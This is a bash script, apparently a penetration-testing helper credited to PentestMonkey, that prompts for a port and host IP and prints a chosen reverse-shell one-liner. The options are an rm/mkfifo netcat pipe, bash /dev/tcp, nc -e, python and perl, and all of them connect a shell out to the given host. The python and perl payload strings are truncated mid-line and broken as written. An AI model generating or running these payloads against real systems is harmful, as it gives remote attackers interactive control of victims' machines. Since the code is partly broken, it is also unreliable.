#!/bin/bash


#Configuration of the reverse shell


echo -ne "Port to listen: " && read PORT

echo ""

echo -ne "Host IP: "  && read IP

echo ""

#PentestMonkey Reverse Shell Options


echo -ne "Which type of reverse shell do you want to use? (rm, bash, nc, python or perl): " && read reverse

rm="rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $IP $PORT >/tmp/f"

bash="bash -i >& /dev/tcp/$IP/$PORT 0>&1"

nc="nc -e /bin/sh $IP $PORT"

python="python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("$IP",$PORT));os."

perl="perl -e 'use Socket;$i="$IP";$p=$PORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,"


#Display of the reverse shell


if [ "$reverse" == "rm" ]; then
echo ""
echo $rm
fi

if [ "$reverse" == "bash" ]; then
echo ""
echo $bash
fi

if [ "$reverse" == "nc" ]; then
echo ""
echo $nc
fi

if [ "$reverse" == "python" ]; then
echo ""
echo $python
fi

if [ "$reverse" == "perl" ]; then
echo ""
echo $perl
fi

echo ""
